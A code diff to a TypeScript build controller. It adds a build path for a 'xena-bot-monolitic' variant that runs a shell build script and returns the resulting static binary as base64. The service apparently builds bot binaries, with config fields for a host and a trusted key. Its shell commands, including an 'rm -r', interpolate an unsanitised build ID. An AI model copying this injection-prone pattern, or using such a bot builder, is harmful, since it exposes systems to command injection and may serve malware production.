@@ -75,6 +75,12 @@ export default class BuildsController {
           ? response.ok(apep)
           : response.internalServerError({ success: false, message: 'Failed to build.' })
 
+      case 'XENA_BOT_MONOLITIC':
+        const monolitic = await this.buildMonolitic(buildId, buildProfileId)
+        return monolitic
+          ? response.ok(monolitic)
+          : response.internalServerError({ success: false, message: 'Failed to build.' })
+
       case 'XENA_BOT_ANACONDA':
         if (!buildProfile.config.atilaHost || !buildProfile.config.trustedPublicKey)
           throw 'BAD_ANACONDA_CONFIG'
@@ -196,6 +202,60 @@ export default class BuildsController {
     return build.toBinary
   }
 
+  private buildMonolitic = async (
+    buildId: string,
+    buildProfileId: string,
+  ) => {
+    fs.renameSync(
+      `${Service.Git.pathPrefix}${buildId}/bots/xena-bot-monolitic/env.example.hpp`,
+      `${Service.Git.pathPrefix}${buildId}/bots/xena-bot-monolitic/env.hpp`,
+    )
+
+    const envContent = fs.readFileSync(`${Service.Git.pathPrefix}${buildId}/bots/xena-bot-monolitic/env.hpp`)
+      .toString()
+      //.replace('#define TALK', '// #define TALK')
+    
+    fs.writeFileSync(`${Service.Git.pathPrefix}${buildId}/bots/xena-bot-monolitic/env.hpp`, envContent)
+
+    // Build the binary.
+    const buildOutput = (() => {
+      const buildCommand =
+        `cd ${Service.Git.pathPrefix}${buildId}/bots/xena-bot-monolitic && sh build.sh`
+      try {
+        return Helper.Shell.exe(buildCommand)
+      } catch (e) {
+        console.warn(e)
+        return 'ERROR'
+      }
+    })()
+    
+    if (buildOutput == 'ERROR')
+      throw Error('Unable to build.')
+    
+    const botLocation = `${Env.get('BUILD_DESTINATION')}${buildId}/bots/xena-bot-monolitic/build/main_static`
+
+    // Base64 binary.
+    const base64Binary = await Domain.Build.getBinary(botLocation)
+        
+    // Store the build.
+    const build = Domain.Build.fromJSON({
+      id: buildId,
+      buildProfileId, 
+      data: base64Binary,
+    })
+
+    // Repo cleaning.
+    try {
+      Helper.Shell.exe(`rm -r ${Service.Git.pathPrefix}${buildId}`)
+    } catch (e) {
+      console.warn(e)
+      return 'ERROR'
+    }
+
+    // Return the build binary.
+    return build.toBinary
+  }
+
   private buildApep = async (
     buildId: string,
     buildProfileId: string,
@@ -245,11 +305,11 @@ export default class BuildsController {
     const base64Binary = await Domain.Build.getBinary(botLocation)
 
     // Store the build.
-    const build = await Repo.Build.insert(Domain.Build.fromJSON({
+    const build = Domain.Build.fromJSON({
       id: buildId,
       buildProfileId, 
       data: base64Binary,
-    })).then(build => Domain.Build.fromJSON(build))
+    })
 
     // Repo cleaning.
     try {
